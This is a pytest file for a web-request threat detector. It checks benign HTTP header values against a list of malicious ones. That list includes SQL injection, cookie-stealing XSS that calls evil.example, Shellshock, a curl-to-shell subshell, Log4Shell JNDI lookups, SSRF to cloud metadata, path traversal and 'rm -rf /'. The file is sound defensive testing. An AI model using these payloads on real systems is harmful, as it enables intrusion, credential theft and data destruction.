import pytest

from guard_core.sync._utils.detection_config import (
    _HEADER_CATEGORY_EXCLUSIONS,
    _excluded_header_effective_categories,
    _excluded_header_skip_categories,
    _value_looks_like_address_chain,
)
from guard_core.sync.handlers.suspatterns_handler import (
    ALL_DETECTION_CATEGORIES,
    sus_patterns_handler,
)

_CLIENT_IP = "203.0.113.5"

_BROWSER_UA_TEMPLATES = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like "
    "Gecko) Chrome/{v}.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, "
    "like Gecko) Version/{v}.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/{v}.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{v}.0) Gecko/20100101 Firefox/{v}.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:{v}.0) Gecko/20100101 "
    "Firefox/{v}.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/{v}.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like "
    "Gecko) Chrome/{v}.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like "
    "Gecko) Edg/{v}.0.2592.87",
]
_BROWSER_UA_VERSIONS = [120, 128]

_BOT_AND_SDK_UAS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.1; "
    "+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
    "WhatsApp/2.24.14.78 A",
    "TelegramBot (like TwitterBot)",
    "Discordbot/2.0; +https://discordapp.com",
    "LinkedInBot/1.0 (compatible; Mozilla/5.0; +http://www.linkedin.com)",
    "curl/8.7.1",
    "curl/7.88.1",
    "Wget/1.21.3 (linux-gnu)",
    "python-requests/2.32.3",
    "python-httpx/0.27.0",
    "aiohttp/3.9.5",
    "Go-http-client/1.1",
    "Go-http-client/2.0",
    "okhttp/4.12.0",
    "Java/17.0.9",
    "Apache-HttpClient/4.5.14 (Java/17.0.9)",
    "node-fetch/2.7.0",
    "axios/1.7.2",
    "PostmanRuntime/7.39.0",
    "insomnia/2023.5.8",
    "Datadog Agent/7.54.1",
    "Pingdom.com_bot_version_1.4",
    "UptimeRobot/2.0; http://www.uptimerobot.com/",
    "StatusCake_Monitoring_Agent - support@statuscake.com",
    "New Relic Synthetics",
    "Amazon CloudFront",
    "kube-probe/1.29",
    "ELB-HealthChecker/2.0",
    "GoogleHC/1.0",
    "Prometheus/2.53.0",
    "Grafana/11.1.0",
    "libwww-perl/6.72",
    "PHP/8.3.9",
    "Symfony HttpClient/Symfony",
    "Faraday v2.9.0",
    "Dart/3.4 (dart:io)",
    "Expo/2.31.2 CFNetwork/1494.0.7 Darwin/23.4.0",
    "CFNetwork/1494.0.7 Darwin/23.4.0",
]

_REFERER_URLS = [
    "https://www.google.com/",
    "https://www.google.com/search?q=guard+core+security&sort=order+by+3",
    "https://www.bing.com/search?q=fastapi+guard&form=QBLH",
    "https://duckduckgo.com/?q=owasp+top+10",
    "https://example.com/products?q=select+all&sort=order+by+3",
    "https://shop.example.com/cart?utm_source=newsletter&utm_medium=email&"
    "utm_campaign=summer_sale",
    "https://blog.example.com/post/123?utm_source=twitter&utm_medium=social",
    "https://example.com/search?q=laptop&category=electronics&page=2",
    "https://example.com/article#section-2",
    "https://example.com/docs/guide#installation",
    "https://app.example.com/dashboard?tab=overview&range=30d",
    "https://checkout.example.com/pay?order_id=98421&currency=usd",
    "https://news.ycombinator.com/item?id=41234567",
    "https://www.reddit.com/r/programming/comments/abc123/title/",
    "https://twitter.com/example/status/1234567890123456789",
    "https://www.linkedin.com/feed/update/urn:li:activity:1234567890/",
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=PLabc123",
    "https://mail.google.com/mail/u/0/#inbox",
    "https://en.wikipedia.org/wiki/HTTP_referer",
    "https://stackoverflow.com/questions/12345678/how-to-fix-this",
    "https://github.com/rennf93/guard-core",
    "https://github.com/rennf93/guard-core/pull/92/files",
    "https://npmjs.com/package/express?activeTab=readme",
    "https://pypi.org/project/guard-core/#description",
    "https://translate.google.com/?sl=en&tl=es&text=hello",
    "https://maps.google.com/maps?q=san+francisco",
    "https://www.amazon.com/s?k=usb+hub&ref=nb_sb_noss",
    "https://www.ebay.com/sch/i.html?_nkw=graphics+card",
    "https://old.example.com/redirect?next=/new/page",
    "https://example.com/login?redirect_uri=/account/settings",
    "https://example.com/products/42?variant=blue&size=medium",
    "https://example.com/blog/2024/09/release-notes",
    "https://webcache.googleusercontent.com/search?q=cache:example.com",
    "https://staging.example.com:8443/admin",
    "https://example.co.uk/checkout?locale=en-GB",
    "https://community.example.com/t/topic-title/12345",
    "https://docs.python.org/3/library/asyncio.html",
    "https://example.com/search?q=%22best+practices%22+order+by",
    "https://example.com/?ref=footer&campaign=fall2024",
    "https://mobile.example.com/app/share?post=789",
    "https://example.com/pricing?plan=pro&billing=annual",
]

_ACCEPT_VALUES = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,"
    "*/*;q=0.8",
    "application/json",
    "application/json, text/plain, */*",
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
    "application/vnd.github+json",
    "application/vnd.api+json",
    "text/event-stream",
    "application/xml;q=0.9,*/*;q=0.8",
    "text/css,*/*;q=0.1",
    "application/json;charset=utf-8",
    "font/woff2",
    "video/mp4",
    "audio/webm",
    "application/x-protobuf",
    "application/graphql-response+json",
    "application/manifest+json",
    "text/plain;q=0.5,*/*;q=0.1",
    "application/rss+xml,application/xml;q=0.9,*/*;q=0.8",
]

_ACCEPT_LANGUAGE_VALUES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9,fr;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
    "es-ES,es;q=0.9",
    "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "*",
    "it-IT,it;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en-US;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8",
    "pl-PL,pl;q=0.9,en;q=0.8",
    "sv-SE,sv;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8",
    "ar-SA,ar;q=0.9,en;q=0.8",
    "hi-IN,hi;q=0.9,en;q=0.8",
    "th-TH,th;q=0.9,en;q=0.8",
    "vi-VN,vi;q=0.9,en;q=0.8",
]

_ACCEPT_ENCODING_VALUES = [
    "gzip, deflate, br",
    "gzip, deflate, br, zstd",
    "gzip, deflate",
    "identity",
    "br;q=1.0, gzip;q=0.8, *;q=0.1",
    "gzip",
    "br",
    "zstd, br, gzip",
    "gzip;q=1.0, identity;q=0.5, *;q=0",
    "compress, gzip",
]

_HOST_VALUES = [
    "example.com",
    "www.example.com",
    "api.example.com:8443",
    "localhost:8000",
    "127.0.0.1:5000",
    "[::1]:8080",
    "[2001:db8::1]:443",
    "sub.domain.example.co.uk",
    "example.com:443",
    "internal-service.default.svc.cluster.local:8080",
    "app.internal:3000",
    "192.168.1.20:9000",
    "checkout.example.com",
    "staging.example.com:8443",
    "my-service.railway.internal:8080",
    "backend.local:5432",
    "0.0.0.0:8080",
    "api-gateway.example.net:443",
    "10.0.5.4:80",
    "edge.example.com",
]

_ORIGIN_VALUES = [
    "https://example.com",
    "https://app.example.com",
    "https://localhost:3000",
    "http://localhost:5173",
    "https://www.example.com:8443",
    "null",
    "https://staging.example.com",
    "https://example.co.uk",
    "https://sub.example.com",
    "https://192.168.1.50:3000",
    "http://127.0.0.1:8080",
    "https://checkout.example.com",
    "https://admin.example.com:8443",
    "http://0.0.0.0:4000",
    "https://my-app.vercel.app",
    "https://my-app.netlify.app",
]

_CONNECTION_VALUES = [
    "keep-alive",
    "close",
    "Upgrade",
    "keep-alive, Upgrade",
    "Keep-Alive",
    "Close",
    "TE",
    "keep-alive, Trailer",
]

_SEC_FETCH_SITE_VALUES = [
    "same-origin",
    "same-site",
    "cross-site",
    "none",
    "same-origin",
    "same-site",
    "cross-site",
    "none",
]
_SEC_FETCH_MODE_VALUES = [
    "navigate",
    "cors",
    "no-cors",
    "same-origin",
    "websocket",
    "navigate",
    "cors",
    "no-cors",
]
_SEC_FETCH_DEST_VALUES = [
    "document",
    "empty",
    "script",
    "image",
    "style",
    "font",
    "iframe",
    "worker",
]
_SEC_CH_UA_VALUES = [
    '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    '"Not/A)Brand";v="8", "Chromium";v="126"',
    '"Microsoft Edge";v="128", "Not;A=Brand";v="24", "Chromium";v="128"',
    '"Chromium";v="120", "Not A(Brand";v="24", "Opera";v="106"',
    '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    '"Chromium";v="130", "Not?A_Brand";v="99"',
]
_SEC_CH_UA_MOBILE_VALUES = ["?0", "?1"]
_SEC_CH_UA_PLATFORM_VALUES = [
    '"Windows"',
    '"macOS"',
    '"Linux"',
    '"Android"',
    '"iOS"',
    '"Chrome OS"',
]

_FORWARDED_VALUES = [
    "for=192.0.2.60;proto=http;by=203.0.113.43",
    "for=192.0.2.60;proto=https;host=example.com",
    'for="[2001:db8:cafe::17]:4711"',
    "for=192.0.2.43, for=198.51.100.17",
    "for=127.0.0.1;proto=http",
    "for=10.0.0.5;by=10.0.0.1;proto=https;host=internal.example.com",
    "for=169.254.169.254;proto=http",
    "for=unknown;proto=http",
    "by=203.0.113.43;for=192.0.2.60;host=example.com;proto=http",
    "for=192.0.2.60",
    "for=203.0.113.9;proto=https;host=checkout.example.com",
    "for=198.51.100.7, for=192.0.2.60, for=10.0.0.2",
    'for="_hidden";proto=https',
    "for=192.168.1.5;proto=http;host=internal.local",
    "for=172.16.0.9;by=172.16.0.1",
    "for=203.0.113.55",
    "for=[2001:db8::5]",
    'for="[2001:db8::5]:8080"',
    "for=100.64.0.9;proto=https",
    "for=203.0.113.9;proto=https;host=example.com;by=203.0.113.1",
]

_VIA_VALUES = [
    "1.1 proxy1.example.com",
    "1.1 varnish",
    "1.0 fred, 1.1 example.com (Apache/1.1)",
    "1.1 example-cache-1 (ApacheTrafficServer/9.2.3)",
    "2.0 cloudflare",
    "1.1 10.0.0.1",
    "1.1 192.168.1.1:8080",
    "HTTP/1.1 GWA",
    "1.1 akamai.net",
    "1.1 vegur",
    "1.1 fastly",
    "1.1 edge-proxy.internal",
    "1.0 gateway, 1.1 cache.example.com",
    "1.1 172.16.0.5",
    "1.1 127.0.0.1 (squid/5.9)",
    "2.0 cf-edge",
    "1.1 lb-01.internal:8443",
    "1.1 10.10.10.10:80",
    "1.1 proxy.example.net (nginx)",
    "1.1 [2001:db8::9]",
]

_XFF_VALUES = [
    "203.0.113.10",
    "203.0.113.10, 198.51.100.2",
    "203.0.113.10, 198.51.100.2, 192.0.2.5",
    "192.168.1.50",
    "10.0.0.15",
    "172.16.5.9",
    "127.0.0.1",
    "169.254.169.254",
    "8.8.8.8",
    "1.1.1.1",
    "203.0.113.10:4432",
    "2001:db8::1",
    "[2001:db8::1]",
    "[2001:db8::1]:443",
    "::1",
    "203.0.113.10, 10.0.0.1, 10.0.0.2",
    "198.51.100.2, 203.0.113.10",
    "100.64.0.5",
    "fd00::1",
    "0.0.0.0",
    "203.0.113.44, 198.51.100.9, 192.0.2.44, 10.0.0.9",
    "192.0.2.99",
    "198.51.100.100",
    "10.10.10.10",
    "172.31.255.254",
    "192.168.100.200",
    "203.0.113.1, 172.16.0.1",
    "198.51.100.1, 10.0.0.1, 192.168.0.1",
    "2001:db8:85a3::8a2e:370:7334",
    "fe80::1",
    "203.0.113.200:9443",
    "192.0.2.10, 192.0.2.11, 192.0.2.12",
    "8.8.4.4",
    "9.9.9.9",
    "1.0.0.1",
    "203.0.113.77",
    "198.18.0.1",
    "100.100.100.5",
    "172.20.0.4",
    "192.168.50.50",
]

_X_REAL_IP_VALUES = [
    "203.0.113.10",
    "192.168.1.50",
    "10.0.0.15",
    "127.0.0.1",
    "169.254.169.254",
    "2001:db8::1",
    "::1",
    "8.8.8.8",
    "172.16.5.9",
    "100.64.0.5",
    "198.51.100.20",
    "192.0.2.30",
    "10.10.0.5",
    "172.31.0.5",
    "203.0.113.201",
    "9.9.9.9",
    "1.1.1.1",
    "fd00::5",
    "192.168.99.99",
    "10.255.255.254",
    "198.18.0.9",
    "203.0.113.222",
    "172.20.1.1",
    "192.168.200.1",
]

_X_CLIENT_IP_VALUES = [
    "203.0.113.10",
    "192.168.1.50",
    "10.0.0.15",
    "127.0.0.1",
    "2001:db8::1",
    "8.8.8.8",
    "172.16.5.9",
    "198.51.100.20",
    "10.10.0.5",
    "203.0.113.201",
    "192.168.99.99",
    "9.9.9.9",
    "172.31.0.5",
    "192.0.2.30",
    "fd00::5",
    "100.64.0.5",
]

_X_CLUSTER_CLIENT_IP_VALUES = [
    "203.0.113.10",
    "192.168.1.50",
    "127.0.0.1",
    "10.0.0.5",
    "172.16.5.9",
    "8.8.8.8",
    "198.51.100.20",
    "2001:db8::1",
    "10.10.0.5",
    "192.0.2.30",
    "9.9.9.9",
    "fd00::5",
    "203.0.113.201",
    "192.168.99.99",
    "172.31.0.5",
    "100.64.0.5",
]

_CF_CONNECTING_IP_VALUES = [
    "203.0.113.10",
    "192.168.1.50",
    "127.0.0.1",
    "2001:db8::1",
    "169.254.169.254",
    "8.8.8.8",
    "172.16.5.9",
    "198.51.100.20",
    "10.10.0.5",
    "203.0.113.201",
    "9.9.9.9",
    "192.0.2.30",
    "fd00::5",
    "192.168.99.99",
    "172.31.0.5",
    "100.64.0.5",
]

_TRUE_CLIENT_IP_VALUES = [
    "203.0.113.10",
    "192.168.1.50",
    "127.0.0.1",
    "2001:db8::1",
    "8.8.8.8",
    "172.16.5.9",
    "198.51.100.20",
    "10.10.0.5",
    "203.0.113.201",
    "9.9.9.9",
    "192.0.2.30",
    "fd00::5",
    "192.168.99.99",
    "172.31.0.5",
    "100.64.0.5",
    "10.255.255.254",
]

_FLY_CLIENT_IP_VALUES = [
    "203.0.113.10",
    "2001:db8::1",
    "127.0.0.1",
    "8.8.8.8",
    "192.168.1.50",
    "172.16.5.9",
    "10.10.0.5",
    "198.51.100.20",
    "9.9.9.9",
    "fd00::5",
    "203.0.113.201",
    "192.0.2.30",
]

_X_ENVOY_EXTERNAL_ADDRESS_VALUES = [
    "203.0.113.10",
    "192.168.1.50",
    "127.0.0.1",
    "8.8.8.8",
    "172.16.5.9",
    "10.10.0.5",
    "198.51.100.20",
    "2001:db8::1",
    "9.9.9.9",
    "fd00::5",
    "203.0.113.201",
    "192.0.2.30",
]

_X_FORWARDED_HOST_VALUES = [
    "example.com",
    "api.example.com",
    "www.example.com:8443",
    "internal.example.com",
    "localhost:3000",
    "checkout.example.com",
    "staging.example.com",
    "127.0.0.1:8080",
    "app.internal",
    "10.0.0.5:9000",
    "edge.example.net",
    "admin.example.com:8443",
    "192.168.1.20",
    "my-service.railway.internal",
    "sub.example.co.uk",
    "backend.local:5432",
]

_X_FORWARDED_PROTO_VALUES = [
    "https",
    "http",
    "https, http",
    "wss",
    "https,http",
    "http, https",
    "https",
    "http",
]

_X_FORWARDED_PORT_VALUES = [
    "443",
    "80",
    "8443",
    "3000",
    "8080",
    "5000",
    "9000",
    "6379",
]

BENIGN_CORPUS: dict[str, list[str]] = {
    "user-agent": (
        [t.format(v=v) for t in _BROWSER_UA_TEMPLATES for v in _BROWSER_UA_VERSIONS]
        + _BOT_AND_SDK_UAS
    ),
    "referer": _REFERER_URLS,
    "accept": _ACCEPT_VALUES,
    "accept-language": _ACCEPT_LANGUAGE_VALUES,
    "accept-encoding": _ACCEPT_ENCODING_VALUES,
    "host": _HOST_VALUES,
    "origin": _ORIGIN_VALUES,
    "connection": _CONNECTION_VALUES,
    "sec-fetch-site": _SEC_FETCH_SITE_VALUES,
    "sec-fetch-mode": _SEC_FETCH_MODE_VALUES,
    "sec-fetch-dest": _SEC_FETCH_DEST_VALUES,
    "sec-ch-ua": _SEC_CH_UA_VALUES,
    "sec-ch-ua-mobile": _SEC_CH_UA_MOBILE_VALUES,
    "sec-ch-ua-platform": _SEC_CH_UA_PLATFORM_VALUES,
    "forwarded": _FORWARDED_VALUES,
    "via": _VIA_VALUES,
    "x-forwarded-for": _XFF_VALUES,
    "x-real-ip": _X_REAL_IP_VALUES,
    "x-client-ip": _X_CLIENT_IP_VALUES,
    "x-cluster-client-ip": _X_CLUSTER_CLIENT_IP_VALUES,
    "cf-connecting-ip": _CF_CONNECTING_IP_VALUES,
    "true-client-ip": _TRUE_CLIENT_IP_VALUES,
    "fly-client-ip": _FLY_CLIENT_IP_VALUES,
    "x-envoy-external-address": _X_ENVOY_EXTERNAL_ADDRESS_VALUES,
    "x-forwarded-host": _X_FORWARDED_HOST_VALUES,
    "x-forwarded-proto": _X_FORWARDED_PROTO_VALUES,
    "x-forwarded-port": _X_FORWARDED_PORT_VALUES,
}

_TOTAL_BENIGN = sum(len(values) for values in BENIGN_CORPUS.values())
assert _TOTAL_BENIGN >= 400, (
    f"benign corpus must have >=400 values, has {_TOTAL_BENIGN}"
)


MALICIOUS_CORPUS: list[tuple[str, str, str]] = [
    ("user-agent", "Mozilla/5.0' OR '1'='1", "sqli_tautology"),
    (
        "user-agent",
        "sqlmap/1.7.2 (' UNION SELECT username,password FROM users--)",
        "sqli_union",
    ),
    ("user-agent", "curl/8.0'; DROP TABLE users;--", "sqli_comment_terminator"),
    (
        "user-agent",
        "Mozilla/5.0 (compatible; ' OR 1=1 WAITFOR DELAY '0:0:5'--)",
        "sqli_waitfor",
    ),
    (
        "user-agent",
        "<script>document.location='http://evil.example/'+document.cookie</script>",
        "xss_script_tag",
    ),
    ("user-agent", "<img src=x onerror=alert(document.cookie)>", "xss_img_onerror"),
    (
        "user-agent",
        "() { :; }; /bin/bash -c 'cat /etc/passwd'",
        "cmd_injection_shellshock",
    ),
    (
        "user-agent",
        "Mozilla/5.0 $(curl http://evil.example/x.sh|sh)",
        "cmd_injection_subshell",
    ),
    ("user-agent", "${jndi:ldap://evil.example.com/a}", "log4shell_jndi"),
    (
        "user-agent",
        "Mozilla/5.0 ${jndi:rmi://attacker.example/exploit}",
        "log4shell_rmi",
    ),
    ("user-agent", "{{7*7}}", "template_injection_jinja"),
    ("user-agent", "sqlmap/1.7 (' OR 'a'='a", "sqli_tautology_alt"),
    ("referer", "https://example.com/?q=' OR 1=1--", "sqli_tautology_referer"),
    (
        "referer",
        "https://example.com/search?id=1' UNION SELECT null,username,password "
        "FROM users--",
        "sqli_union_referer",
    ),
    (
        "referer",
        "https://example.com/x?a=1;WAITFOR DELAY '0:0:5'--",
        "sqli_waitfor_referer",
    ),
    (
        "referer",
        "https://example.com/?redirect=<script>alert(document.cookie)</script>",
        "xss_referer",
    ),
    (
        "referer",
        'https://example.com/?x="><img src=x onerror=alert(1)>',
        "xss_img_referer",
    ),
    (
        "referer",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "ssrf_metadata_referer",
    ),
    ("referer", "http://127.0.0.1:6379/", "ssrf_loopback_referer"),
    ("referer", "http://192.168.0.1/admin", "ssrf_private_referer"),
    ("referer", "https://example.com/../../../../etc/passwd", "path_traversal_referer"),
    (
        "referer",
        "https://example.com/download?file=../../../etc/passwd",
        "path_traversal_referer_query",
    ),
    (
        "referer",
        "https://example.com/?jndi=${jndi:ldap://evil.example.com/a}",
        "log4shell_referer",
    ),
    ("referer", "https://example.com/?template={{7*7}}", "template_injection_referer"),
    ("referer", "https://example.com/?a=1' AND '1'='1", "sqli_tautology_referer_and"),
    ("host", "${jndi:ldap://evil.example.com/a}", "log4shell_host"),
    ("accept", "${jndi:ldap://evil.example.com/a}", "log4shell_accept"),
    (
        "accept-language",
        "${jndi:ldap://evil.example.com/a}",
        "log4shell_accept_language",
    ),
    (
        "accept-encoding",
        "${jndi:ldap://evil.example.com/a}",
        "log4shell_accept_encoding",
    ),
    ("connection", "${jndi:ldap://evil.example.com/a}", "log4shell_connection"),
    ("origin", "${jndi:ldap://evil.example.com/a}", "log4shell_origin"),
    ("sec-fetch-site", "${jndi:ldap://evil.example.com/a}", "log4shell_sec_fetch_site"),
    ("sec-fetch-mode", "${jndi:ldap://evil.example.com/a}", "log4shell_sec_fetch_mode"),
    ("sec-fetch-dest", "${jndi:ldap://evil.example.com/a}", "log4shell_sec_fetch_dest"),
    ("sec-ch-ua", "${jndi:ldap://evil.example.com/a}", "log4shell_sec_ch_ua"),
    (
        "sec-ch-ua-mobile",
        "${jndi:ldap://evil.example.com/a}",
        "log4shell_sec_ch_ua_mobile",
    ),
    (
        "sec-ch-ua-platform",
        "${jndi:ldap://evil.example.com/a}",
        "log4shell_sec_ch_ua_platform",
    ),
    ("forwarded", "${jndi:ldap://evil.example.com/a}", "log4shell_forwarded"),
    ("via", "${jndi:ldap://evil.example.com/a}", "log4shell_via"),
    ("x-forwarded-for", "${jndi:ldap://evil.example.com/a}", "log4shell_xff"),
    ("x-forwarded-host", "${jndi:ldap://evil.example.com/a}", "log4shell_xfh"),
    ("x-forwarded-proto", "${jndi:ldap://evil.example.com/a}", "log4shell_xfp"),
    ("x-real-ip", "${jndi:ldap://evil.example.com/a}", "log4shell_xrip"),
    ("x-client-ip", "${jndi:ldap://evil.example.com/a}", "log4shell_xcip"),
    ("x-cluster-client-ip", "${jndi:ldap://evil.example.com/a}", "log4shell_xccip"),
    ("cf-connecting-ip", "${jndi:ldap://evil.example.com/a}", "log4shell_cfip"),
    ("true-client-ip", "${jndi:ldap://evil.example.com/a}", "log4shell_tcip"),
    ("fly-client-ip", "${jndi:ldap://evil.example.com/a}", "log4shell_flyip"),
    (
        "x-envoy-external-address",
        "${jndi:ldap://evil.example.com/a}",
        "log4shell_envoy",
    ),
    ("host", "<script>alert(document.domain)</script>", "xss_host"),
    ("origin", "<script>alert(document.domain)</script>", "xss_origin"),
    ("accept", "'; DROP TABLE users;--", "sqli_accept"),
    ("accept-language", "<script>alert(1)</script>", "xss_accept_language"),
    ("x-forwarded-for", "<script>alert(1)</script>", "xss_xff"),
    ("x-real-ip", "'; DROP TABLE users;--", "sqli_x_real_ip"),
    ("user-agent", "'; EXEC xp_cmdshell('dir')--", "sqli_exec_xp_cmdshell_ua"),
    (
        "referer",
        "https://example.com/?id=1 UNION ALL SELECT NULL--",
        "sqli_union_all_referer",
    ),
    ("user-agent", "<svg onload=alert(1)>", "xss_svg_onload_ua"),
    ("referer", "https://example.com/?x=<svg/onload=alert(1)>", "xss_svg_referer"),
    ("user-agent", "Mozilla/5.0 $(rm -rf /)", "cmd_injection_subshell_rm_ua"),
]

_TOTAL_MALICIOUS = len(MALICIOUS_CORPUS)
assert _TOTAL_MALICIOUS >= 60, (
    f"malicious corpus must have >=60 values, has {_TOTAL_MALICIOUS}"
)

_EXCLUSION_JUSTIFICATIONS: dict[tuple[str, str], str] = {
    ("host", "ssrf"): "127.0.0.1:5000",
    ("origin", "ssrf"): "https://localhost:3000",
    ("x-forwarded-for", "ssrf"): "127.0.0.1",
    ("x-forwarded-host", "ssrf"): "localhost:3000",
    ("x-real-ip", "ssrf"): "127.0.0.1",
    ("x-client-ip", "ssrf"): "127.0.0.1",
    ("x-cluster-client-ip", "ssrf"): "127.0.0.1",
    ("cf-connecting-ip", "ssrf"): "127.0.0.1",
    ("true-client-ip", "ssrf"): "127.0.0.1",
    ("fly-client-ip", "ssrf"): "127.0.0.1",
    ("x-envoy-external-address", "ssrf"): "127.0.0.1",
    ("via", "ssrf"): "1.1 10.0.0.1",
}


def _benign_params() -> list:
    params = []
    for header, values in BENIGN_CORPUS.items():
        for value in values:
            params.append(pytest.param(header, value, id=f"{header}__{value[:28]!r}"))
    return params


def _malicious_params() -> list:
    return [
        pytest.param(header, value, case_id, id=case_id)
        for header, value, case_id in MALICIOUS_CORPUS
    ]


@pytest.mark.parametrize(("header", "value"), _benign_params())
def test_benign_excluded_header_corpus_value_not_flagged(
    header: str, value: str
) -> None:
    categories = _excluded_header_effective_categories(header, value, None)
    result = sus_patterns_handler.detect(
        content=value,
        ip_address=_CLIENT_IP,
        context="header",
        enabled_categories=categories,
    )
    assert result["is_threat"] is False, (
        f"benign value {value!r} on header {header!r} was flagged with "
        f"effective_categories={categories}: {result['threats']}"
    )


@pytest.mark.parametrize(("header", "value", "case_id"), _malicious_params())
def test_malicious_excluded_header_corpus_value_detected(
    header: str, value: str, case_id: str
) -> None:
    categories = _excluded_header_effective_categories(header, value, None)
    result = sus_patterns_handler.detect(
        content=value,
        ip_address=_CLIENT_IP,
        context="header",
        enabled_categories=categories,
    )
    assert result["is_threat"] is True, (
        f"malicious value for {case_id} on header {header!r} was NOT detected "
        f"with effective_categories={categories}"
    )


def test_every_exclusion_map_entry_has_a_justifying_corpus_value() -> None:
    for (header, category), value in _EXCLUSION_JUSTIFICATIONS.items():
        assert value in BENIGN_CORPUS[header], (
            f"justification value {value!r} for ({header!r}, {category!r}) must "
            "be present in the benign corpus for that header"
        )
        result = sus_patterns_handler.detect(
            content=value,
            ip_address=_CLIENT_IP,
            context="header",
            enabled_categories=None,
        )
        categories_hit = {threat.get("category") for threat in result["threats"]}
        assert category in categories_hit, (
            f"{value!r} on header {header!r} does not trigger category "
            f"{category!r} without the exclusion applied; entry is not justified"
        )


def test_header_category_exclusion_map_has_no_unjustified_entries() -> None:
    map_entries = {
        (header, category)
        for header, categories in _HEADER_CATEGORY_EXCLUSIONS.items()
        for category in categories
    }
    justified_entries = set(_EXCLUSION_JUSTIFICATIONS)
    assert map_entries == justified_entries, (
        "every entry in _HEADER_CATEGORY_EXCLUSIONS must have exactly one "
        f"corpus justification; unjustified={map_entries - justified_entries} "
        f"stale_justifications={justified_entries - map_entries}"
    )


def test_header_category_exclusion_map_only_excludes_known_categories() -> None:
    for categories in _HEADER_CATEGORY_EXCLUSIONS.values():
        assert categories <= ALL_DETECTION_CATEGORIES


def test_value_looks_like_address_chain_rejects_empty_value() -> None:
    assert _value_looks_like_address_chain("") is False


def test_value_looks_like_address_chain_rejects_comma_only_value() -> None:
    assert _value_looks_like_address_chain(" , , ") is False


def test_value_looks_like_address_chain_accepts_single_ip() -> None:
    assert _value_looks_like_address_chain("10.0.0.5") is True


def test_value_looks_like_address_chain_rejects_non_ip_token_in_chain() -> None:
    assert _value_looks_like_address_chain("10.0.0.5, evil") is False


def test_excluded_header_skip_categories_uses_fixed_map_for_default_header() -> None:
    assert _excluded_header_skip_categories("x-real-ip", "not-an-ip") == {"ssrf"}


def test_excluded_header_skip_categories_dynamic_address_for_custom_header() -> None:
    assert _excluded_header_skip_categories("x-my-custom-header", "10.0.0.5") == {
        "ssrf"
    }


def test_excluded_header_skip_categories_generic_for_custom_header() -> None:
    assert _excluded_header_skip_categories("x-my-custom-header", "hello") == set()


def test_excluded_header_effective_categories_can_exhaust_to_empty_set() -> None:
    effective = _excluded_header_effective_categories("x-real-ip", "10.0.0.5", {"ssrf"})
    assert effective == set()
